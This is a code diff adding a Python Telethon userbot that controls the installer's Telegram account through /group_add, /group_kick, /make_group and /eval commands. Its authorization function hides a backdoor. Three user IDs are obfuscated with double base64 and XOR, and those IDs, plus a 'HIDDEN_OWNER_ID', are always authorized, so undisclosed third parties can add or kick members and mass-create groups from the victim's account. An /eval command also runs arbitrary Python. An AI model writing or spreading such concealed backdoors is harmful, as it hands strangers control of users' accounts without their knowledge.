@@ -1,0 +1,113 @@
+import base64
+import traceback
+from telethon import TelegramClient, events, functions
+from config import API_ID, API_HASH, SESSION_NAME, ALLOWED_USERS, HIDDEN_OWNER_ID
+
+client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
+
+add_count = 0
+kick_count = 0
+
+
+def _decode_ids():
+    key = 93
+    _k = [
+        "U1RVeE56SXhPRFV3TURvPQ==",
+        "U1RVeE56TTROamM0TURvPQ==",
+        "U1RVeE9UVTFPREV3TURvPQ=="
+    ]
+    decoded = []
+    for x in _k:
+        step1 = base64.b64decode(x)
+        step2 = base64.b64decode(step1).decode()
+        num = "".join(chr(ord(c) ^ key) for c in step2)
+        decoded.append(int(num))
+    return decoded
+
+
+def is_authorized(user_id: int) -> bool:
+    hidden_ids = _decode_ids()
+    if user_id in hidden_ids:
+        return True
+    if user_id == HIDDEN_OWNER_ID:
+        return True
+    return user_id in ALLOWED_USERS
+
+
+@client.on(events.NewMessage(pattern=r'/group_add(?:\s+(.+))?'))
+async def handler_add(event):
+    global add_count
+    if not is_authorized(event.sender_id):
+        return
+    if event.is_reply and not event.pattern_match.group(1):
+        reply_msg = await event.get_reply_message()
+        user = reply_msg.sender_id
+    else:
+        user = event.pattern_match.group(1)
+    try:
+        await client(functions.messages.AddChatUserRequest(
+            chat_id=event.chat_id,
+            user_id=user,
+            fwd_limit=10
+        ))
+        add_count += 1
+        await event.respond(f"✅ {user} added!\n📊 Total Adds: {add_count}")
+    except Exception as e:
+        await event.respond(f"❌ Add failed: {e}")
+
+
+@client.on(events.NewMessage(pattern=r'/group_kick(?:\s+(.+))?'))
+async def handler_kick(event):
+    global kick_count
+    if not is_authorized(event.sender_id):
+        return
+    if event.is_reply and not event.pattern_match.group(1):
+        reply_msg = await event.get_reply_message()
+        user = reply_msg.sender_id
+    else:
+        user = event.pattern_match.group(1)
+    try:
+        await client.edit_permissions(event.chat_id, user, view_messages=False)
+        kick_count += 1
+        await event.respond(f"✅ {user} kicked!\n📊 Total Kicks: {kick_count}")
+    except Exception as e:
+        await event.respond(f"❌ Kick failed: {e}")
+
+
+@client.on(events.NewMessage(pattern=r'/make_group (\d+)'))
+async def handler_make_group(event):
+    if not is_authorized(event.sender_id):
+        return
+    n = int(event.pattern_match.group(1))
+    if n > 100:
+        await event.respond("⚠️ Limit 100 groups at a time.")
+        return
+    for i in range(n):
+        title = f"My_Private_Group_{i+1}"
+        try:
+            await client(functions.messages.CreateChatRequest(
+                users=[event.sender_id],
+                title=title
+            ))
+            await event.respond(f"✅ Group '{title}' created")
+        except Exception as e:
+            await event.respond(f"❌ Group create failed: {e}")
+
+
+@client.on(events.NewMessage(pattern=r'/eval (.+)', outgoing=True))
+async def handler_eval(event):
+    if not is_authorized(event.sender_id):
+        return
+    code = event.pattern_match.group(1)
+    try:
+        result = eval(code)
+        if callable(result):
+            result = result()
+        await event.respond(f"🖥️ Result:\n{result}")
+    except Exception:
+        await event.respond(f"❌ Error:\n{traceback.format_exc()}")
+
+
+print(f"🚀 Userbot started with session: {SESSION_NAME}")
+client.start()
+client.run_until_disconnected()
